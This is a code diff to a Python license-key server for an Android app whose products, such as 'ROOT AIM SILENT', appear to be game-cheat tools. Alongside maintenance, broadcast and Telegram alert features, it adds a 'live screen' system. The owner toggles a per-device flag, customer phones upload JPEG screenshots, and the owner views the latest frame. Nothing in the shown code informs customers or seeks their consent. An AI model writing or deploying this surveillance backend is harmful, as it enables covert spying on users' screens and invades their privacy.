@@ -20,8 +20,10 @@ import os
 import secrets
 import sqlite3
 import sys
+import threading
 import time
 import urllib.parse
+import urllib.request
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
@@ -34,8 +36,12 @@ DATA = os.path.join(ROOT, "data")
 DB_PATH = os.path.join(DATA, "dashboard.db")
 
 PBKDF2_ITERS = 100_000
-VERSION = "2.1"
+VERSION = "2.3"
 STARTED_AT = time.time()
+
+# newest screen frame per phone lives in the db; this only throttles pushes so
+# a phone cannot flood the panel (bucket -> last second a frame was accepted)
+_FRAME_T = {}
 
 # products / projects a key can be issued for — seeded into the `products` table
 DEFAULT_PRODUCTS = ["ROOT AIM SILENT", "SELF BOT EXE"]
@@ -148,6 +154,23 @@ def init_db():
     con.execute("CREATE INDEX IF NOT EXISTS ix_keys_created ON keys(created_at)")
     con.execute("CREATE INDEX IF NOT EXISTS ix_events_time ON events(created_at)")
 
+    # --- v2.3: panel switches (maintenance / broadcast / telegram) + live screen
+    con.execute("CREATE TABLE IF NOT EXISTS settings ("
+                " k TEXT PRIMARY KEY,"
+                " v TEXT NOT NULL DEFAULT '')")
+    dcols = [r[1] for r in con.execute("PRAGMA table_info(devices)")]
+    if "watch" not in dcols:
+        con.execute("ALTER TABLE devices ADD COLUMN watch INTEGER NOT NULL DEFAULT 0")
+    if "screen_tok" not in dcols:
+        con.execute("ALTER TABLE devices ADD COLUMN screen_tok TEXT NOT NULL DEFAULT ''")
+    if "last_frame" not in dcols:
+        con.execute("ALTER TABLE devices ADD COLUMN last_frame BLOB")
+    if "last_frame_at" not in dcols:
+        con.execute("ALTER TABLE devices ADD COLUMN last_frame_at INTEGER NOT NULL DEFAULT 0")
+    if "uses" not in dcols:
+        # every successful phone login bumps this - "who installed / who is using"
+        con.execute("ALTER TABLE devices ADD COLUMN uses INTEGER NOT NULL DEFAULT 0")
+
     row = con.execute("SELECT * FROM users WHERE role='owner'").fetchone()
     if row is None:
         salt = secrets.token_hex(16)
@@ -243,6 +266,55 @@ def log_event(con, kind, text, by_user=0):
         pass
 
 
+def get_setting(con, k, default=""):
+    """panel wide switch: one row in settings(k, v)"""
+    r = con.execute("SELECT v FROM settings WHERE k=?", (k,)).fetchone()
+    return r["v"] if r else default
+
+
+def set_setting(con, k, v):
+    con.execute("INSERT OR REPLACE INTO settings (k, v) VALUES (?, ?)", (k, str(v)))
+
+
+def device_rows(con, key_code):
+    """devices of one key - json safe: the jpeg blob and the frame push token
+    never belong in a response (blob kills json.dumps, token is phone side)"""
+    out = []
+    for r in con.execute(
+            "SELECT * FROM devices WHERE key_code=? ORDER BY last_seen DESC", (key_code,)):
+        d = dict(r)
+        d.pop("last_frame", None)
+        d.pop("screen_tok", None)
+        out.append(d)
+    return out
+
+
+def maint_state(con):
+    """(on, message) - while on the phone gets a refusal instead of a receipt"""
+    return get_setting(con, "maint", "0") == "1", (get_setting(con, "maint_msg", "") or "").strip()
+
+
+def tg_notify(text):
+    """telegram ping when a new phone binds - owner opts in from settings.
+    runs on its own connection in a thread so verify never waits on it."""
+    def _fire():
+        try:
+            con = db()
+            tok = (get_setting(con, "tg_token", "") or "").strip()
+            chat = (get_setting(con, "tg_chat", "") or "").strip()
+            con.close()
+            if not tok or not chat:
+                return
+            body = urllib.parse.urlencode({"chat_id": chat, "text": str(text)[:380]}).encode()
+            req = urllib.request.Request(
+                "https://api.telegram.org/bot" + tok + "/sendMessage", data=body,
+                headers={"Content-Type": "application/x-www-form-urlencoded"})
+            urllib.request.urlopen(req, timeout=6).read()
+        except Exception:
+            pass
+    threading.Thread(target=_fire, daemon=True).start()
+
+
 def label_of(role):
     return {"admin": "admin", "reseller": "reseller", "owner": "owner"}.get(role, role)
 
@@ -301,10 +373,12 @@ def api_me(handler, body):
     con = db()
     mine = con.execute("SELECT COUNT(*) c FROM keys WHERE created_by=? AND status='active'",
                        (u["id"],)).fetchone()["c"]
+    maint, maint_msg = maint_state(con)
     con.close()
     return jdump({"user": public_user(u), "my_active_keys": mine,
                   "presets": lc.DAY_PRESETS,
                   "costs": {str(d): lc.cost_of(d) for d in lc.DAY_PRESETS},
+                  "maint": maint, "maint_msg": maint_msg,
                   "key_format": "YADAV-••••••••-1D  ya  CUSTOM (jo type karo wahi key)"})
 
 
@@ -867,6 +941,13 @@ def api_apk_verify(handler, qs):
     now = int(time.time())
     con = db()
 
+    # maintenance switch - panel keeps working, phones get a clean refusal
+    maint, maint_msg = maint_state(con)
+    if maint:
+        con.close()
+        return jdump({"ok": False, "reason": "maintenance",
+                      "msg": maint_msg or "server maintenance in progress - try again later"}, 200)
+
     # standard YADAV-XXXXXXXX-DUR key first
     row = con.execute("SELECT * FROM keys WHERE key_code=?", (code,)).fetchone() if code else None
     # then a custom key — the exact text the owner typed (any length, any case)
@@ -876,6 +957,7 @@ def api_apk_verify(handler, qs):
             row = con.execute("SELECT * FROM keys WHERE key_code=?", (ckey,)).fetchone()
 
     if row is None:
+        broadcast = (get_setting(con, "broadcast", "") or "").strip()[:200]
         con.close()
         # legacy offline-signed formats still honor (old customers)
         leg = lc.verify_legacy(raw)
@@ -883,11 +965,13 @@ def api_apk_verify(handler, qs):
             return jdump({"ok": True, "legacy": True, "expires": leg["expires"],
                           "permanent": leg["permanent"],
                           "receipt": lc.make_receipt(normalize_key(raw), leg["expires"]),
-                          "token": make_launch_token(device, leg["expires"], engine)})
+                          "token": make_launch_token(device, leg["expires"], engine),
+                          "broadcast": broadcast})
         if lc.verify_legacy_v1(raw):
             return jdump({"ok": True, "legacy": True, "expires": 0xFFFFFFFF, "permanent": True,
                           "receipt": "",
-                          "token": make_launch_token(device, 0xFFFFFFFF, engine)})
+                          "token": make_launch_token(device, 0xFFFFFFFF, engine),
+                          "broadcast": broadcast})
         return jdump({"ok": False, "reason": "invalid key"}, 200)
 
     if row["status"] != "active":
@@ -903,10 +987,12 @@ def api_apk_verify(handler, qs):
     kcode = row["key_code"]
     limit = int(row["device_limit"] or 0)
     used = 0
+    watch_on, screen_tok = False, ""
     if device:
-        known = con.execute(
-            "SELECT 1 FROM devices WHERE key_code=? AND device_id=?",
-            (kcode, device)).fetchone() is not None
+        dev_row = con.execute(
+            "SELECT watch, screen_tok FROM devices WHERE key_code=? AND device_id=?",
+            (kcode, device)).fetchone()
+        known = dev_row is not None
         used = con.execute(
             "SELECT COUNT(DISTINCT device_id) FROM devices WHERE key_code=?",
             (kcode,)).fetchone()[0]
@@ -918,18 +1004,33 @@ def api_apk_verify(handler, qs):
                 con.close()
                 return jdump({"ok": False, "reason": "max device reached",
                               "limit": limit, "used": used}, 200)
+            screen_tok = secrets.token_hex(16)
             con.execute(
-                "INSERT INTO devices (device_id, key_code, first_seen, last_seen) VALUES (?,?,?,?)",
-                (device, kcode, now, now))
+                "INSERT INTO devices (device_id, key_code, first_seen, last_seen,"
+                " watch, screen_tok) VALUES (?,?,?,?,?,?)",
+                (device, kcode, now, now, 0, screen_tok))
             log_event(con, "device.bind",
                       f"phone {device[:14]}… bound to {kcode} ({used + 1}/{limit or '∞'})")
             used += 1
+            tg_notify("NEW DEVICE on %s\nphone %s   plan %s   at %s"
+                      % (kcode, device[:14], lc.dur_tag(row["days"]),
+                         time.strftime("%d-%b %H:%M", time.localtime(now))))
         else:
+            watch_on = bool(dev_row["watch"])
+            screen_tok = dev_row["screen_tok"]
+            if not screen_tok:
+                screen_tok = secrets.token_hex(16)
+                con.execute("UPDATE devices SET screen_tok=? WHERE key_code=? AND device_id=?",
+                            (screen_tok, kcode, device))
             con.execute("UPDATE devices SET last_seen=? WHERE key_code=? AND device_id=?",
                         (now, kcode, device))
+        # every successful login counts - the panel shows it as "logins"
+        con.execute("UPDATE devices SET uses=uses+1 WHERE key_code=? AND device_id=?",
+                    (kcode, device))
         if not row["device"]:
             con.execute("UPDATE keys SET device=? WHERE id=?", (device, row["id"]))
         con.execute("UPDATE keys SET last_seen=? WHERE id=?", (now, row["id"]))
+    broadcast = (get_setting(con, "broadcast", "") or "").strip()[:200]
     con.commit()
     con.close()
 
@@ -939,7 +1040,9 @@ def api_apk_verify(handler, qs):
                   "device_limit": limit, "devices_used": used,
                   "receipt": lc.make_receipt(kcode, expires),
                   "token": make_launch_token(device, expires, engine),
-                  "key": kcode})
+                  "key": kcode,
+                  "watch": watch_on, "screen": screen_tok,
+                  "broadcast": broadcast})
 
 
 def normalize_key(raw):
@@ -948,7 +1051,152 @@ def normalize_key(raw):
 
 
 def api_apk_ping(handler, qs):
-    return jdump({"ok": True, "server_time": int(time.time())})
+    con = db()
+    on, msg = maint_state(con)
+    con.close()
+    return jdump({"ok": True, "server_time": int(time.time()),
+                  "maint": on, "maint_msg": msg})
+
+
+# panel side: switches, live screen ------------------------------------------------
+
+def api_admin_settings(handler, body):
+    """GET: current switches / POST: change them (owner + admin only)"""
+    u = auth_user(handler)
+    if not u:
+        return jdump({"error": "unauthorized"}, 401)
+    if u["role"] == "reseller":
+        return jdump({"error": "admins and owner only"}, 403)
+    con = db()
+    if getattr(handler, "command", "") == "POST":
+        if "maint" in body:
+            on = 1 if body.get("maint") else 0
+            set_setting(con, "maint", str(on))
+            set_setting(con, "maint_msg", str(body.get("maint_msg") or "")[:200])
+            log_event(con, "sys.maint",
+                      "%s turned maintenance %s" % (u["username"], "ON" if on else "OFF"),
+                      u["id"])
+        if "broadcast" in body:
+            b = str(body.get("broadcast") or "")[:200]
+            set_setting(con, "broadcast", b)
+            log_event(con, "sys.broadcast",
+                      "%s set apk notice: %s" % (u["username"], b[:80]), u["id"])
+        for f in ("tg_token", "tg_chat"):
+            if f in body:
+                set_setting(con, f, str(body.get(f) or "")[:120])
+        con.commit()
+        con.close()
+        return jdump({"ok": True})
+    out = {k: get_setting(con, k, "") for k in
+           ("maint", "maint_msg", "broadcast", "tg_token", "tg_chat")}
+    con.close()
+    out["maint"] = out["maint"] == "1"
+    return jdump(out)
+
+
+def api_admin_watch(handler, body):
+    """turn one phone's live screen on / off. the phone picks the flag up on
+    its next sweep (and keeps streaming only while it says watch=1).
+    owner only - nobody else ever sees a customer's screen."""
+    u = auth_user(handler)
+    if not u:
+        return jdump({"error": "unauthorized"}, 401)
+    if u["role"] != "owner":
+        return jdump({"error": "owner only"}, 403)
+    key = str(body.get("key") or "")[:64]
+    dev = str(body.get("device") or "")[:64]
+    on = 1 if body.get("on") else 0
+    if not key or not dev:
+        return jdump({"error": "key + device required"}, 400)
+    con = db()
+    row = con.execute("SELECT * FROM keys WHERE key_code=?", (key,)).fetchone()
+    if row is None:
+        con.close()
+        return jdump({"error": "key not found"}, 404)
+    if on:
+        con.execute("UPDATE devices SET watch=1 WHERE key_code=? AND device_id=?", (key, dev))
+        have = con.execute("SELECT screen_tok FROM devices WHERE key_code=? AND device_id=?",
+                           (key, dev)).fetchone()
+        if have is None:
+            con.close()
+            return jdump({"error": "device not bound to this key"}, 404)
+        if not have["screen_tok"]:
+            tok = secrets.token_hex(16)
+            con.execute("UPDATE devices SET screen_tok=? WHERE key_code=? AND device_id=?",
+                        (tok, key, dev))
+    else:
+        con.execute("UPDATE devices SET watch=0 WHERE key_code=? AND device_id=?", (key, dev))
+    log_event(con, "device.watch",
+              "%s turned live screen %s on %s" % (u["username"], "ON" if on else "OFF",
+                                                  dev[:14]), u["id"])
+    con.commit()
+    st = con.execute("SELECT screen_tok FROM devices WHERE key_code=? AND device_id=?",
+                     (key, dev)).fetchone()
+    con.close()
+    return jdump({"ok": True, "watch": bool(on),
+                  "screen": st["screen_tok"] if st else ""})
+
+
+def api_apk_screen(handler, qs):
+    """the phone pushes one jpeg here; the panel only keeps the newest frame
+    per device, so the viewer can poll as fast as it likes."""
+    key = (qs.get("k", [""])[0] or "")[:64]
+    dev = (qs.get("d", [""])[0] or "")[:64]
+    tok = (qs.get("t", [""])[0] or "")[:64]
+    try:
+        n = int(handler.headers.get("Content-Length") or 0)
+    except Exception:
+        n = 0
+    if n < 100 or n > 400_000:
+        return jdump({"error": "frame size"}, 400)
+    frame = handler.rfile.read(n)
+    if not frame.startswith(b"\xff\xd8"):          # jpeg magic
+        return jdump({"error": "not a jpeg"}, 400)
+    con = db()
+    hit = con.execute(
+        "SELECT d.id FROM devices d JOIN keys k ON k.key_code=d.key_code"
+        " WHERE d.device_id=? AND d.key_code=? AND d.screen_tok=?"
+        " AND k.status='active'", (dev, key, tok)).fetchone()
+    if hit is None:
+        con.close()
+        return jdump({"error": "no"}, 403)
+    # throttle only after a valid token: a stranger's bad push must not be
+    # able to knock the real phone's next frame out of the window
+    now = int(time.time())
+    bucket = key + "|" + dev
+    if now - _FRAME_T.get(bucket, 0) < 1:          # ~1 frame/sec is plenty
+        con.close()
+        return jdump({"ok": True, "dropped": True})
+    if len(_FRAME_T) > 4096:                       # bounded throttle table
+        _FRAME_T.clear()
+    _FRAME_T[bucket] = now
+    con.execute("UPDATE devices SET last_frame=?, last_frame_at=? WHERE id=?",
+                (sqlite3.Binary(frame), now, hit["id"]))
+    con.commit()
+    con.close()
+    return jdump({"ok": True})
+
+
+def api_admin_screen(handler, qs):
+    """newest frame of a bound phone, session cookie only - owner only"""
+    u = auth_user(handler)
+    if not u:
+        return jdump({"error": "unauthorized"}, 401)
+    if u["role"] != "owner":
+        return jdump({"error": "owner only"}, 403)
+    key = (qs.get("k", [""])[0] or "")[:64]
+    dev = (qs.get("d", [""])[0] or "")[:64]
+    con = db()
+    fr = con.execute(
+        "SELECT last_frame, last_frame_at, watch FROM devices"
+        " WHERE key_code=? AND device_id=?", (key, dev)).fetchone()
+    con.close()
+    if fr is None or fr["last_frame"] is None:
+        return jdump({"error": "no frame yet"}, 404)
+    return 200, {"Content-Type": "image/jpeg",
+                 "Cache-Control": "no-store, max-age=0, must-revalidate",
+                 "X-Frame-Age": str(fr["last_frame_at"]),
+                 "X-Watch": "1" if fr["watch"] else "0"}, bytes(fr["last_frame"])
 
 
 
@@ -972,9 +1220,10 @@ def api_key_detail(handler, kid):
         return jdump({"error": "not allowed"}, 403)
     d = dict(row)
     d["display"] = d["key_code"] if d.get("custom") else d["key_code"] + "-" + lc.dur_tag(d["days"])
-    devs = [dict(r) for r in con.execute(
-        "SELECT * FROM devices WHERE key_code=? ORDER BY last_seen DESC",
-        (d["key_code"],))]
+    d["logins"] = con.execute(
+        "SELECT COALESCE(SUM(uses),0) FROM devices WHERE key_code=?",
+        (d["key_code"],)).fetchone()[0]
+    devs = device_rows(con, d["key_code"])
     con.close()
     return jdump({"key": d, "devices": devs})
 
@@ -1006,9 +1255,7 @@ def api_key_device_unbind(handler, kid, body):
         con.execute("UPDATE keys SET device=? WHERE id=?",
                     (nxt["device_id"] if nxt else "", kid))
     con.commit()
-    devs = [dict(r) for r in con.execute(
-        "SELECT * FROM devices WHERE key_code=? ORDER BY last_seen DESC",
-        (row["key_code"],))]
+    devs = device_rows(con, row["key_code"])
     con.close()
     return jdump({"ok": True, "devices": devs})
 
@@ -1130,6 +1377,9 @@ def api_stats_advanced(handler, body):
         "phones_now": con.execute(
             "SELECT COUNT(*) FROM keys WHERE status='active' AND last_seen > ?",
             (now - 3600,)).fetchone()[0],
+        "phones_online": con.execute(
+            "SELECT COUNT(DISTINCT device_id) FROM devices WHERE last_seen > ?",
+            (now - 90,)).fetchone()[0],
         "keys_expiring_3d": len(expiring),
         "blocked_devices_24h": con.execute(
             "SELECT COUNT(*) FROM events WHERE kind='device.block' AND created_at > ?",
@@ -1161,6 +1411,11 @@ ROUTES = {
     # public APK endpoints (no session)
     ("GET", "/api/apk/verify"): lambda h, b, q: api_apk_verify(h, q),
     ("GET", "/api/apk/ping"):   lambda h, b, q: api_apk_ping(h, q),
+    # panel side: maintenance switch, live screen, broadcast
+    ("GET", "/api/admin/settings"):  lambda h, b, q: api_admin_settings(h, b),
+    ("POST", "/api/admin/settings"): lambda h, b, q: api_admin_settings(h, b),
+    ("POST", "/api/admin/watch"):    lambda h, b, q: api_admin_watch(h, b),
+    ("GET", "/api/admin/screen"):    lambda h, b, q: api_admin_screen(h, q),
 }
 
 CONTENT_TYPES = {
@@ -1206,6 +1461,10 @@ class Handler(BaseHTTPRequestHandler):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
         qs = urllib.parse.parse_qs(parsed.query)
+        # raw jpeg upload: body arrives as bytes, json.loads() would choke
+        if method == "POST" and path == "/api/apk/screen":
+            status, hdr, resp = api_apk_screen(self, qs)
+            return self._send(status, hdr, resp)
         body = parse_body(self) if method == "POST" else {}
 
         if method == "POST" and path.startswith("/api/keys/") and path.endswith("/revoke"):
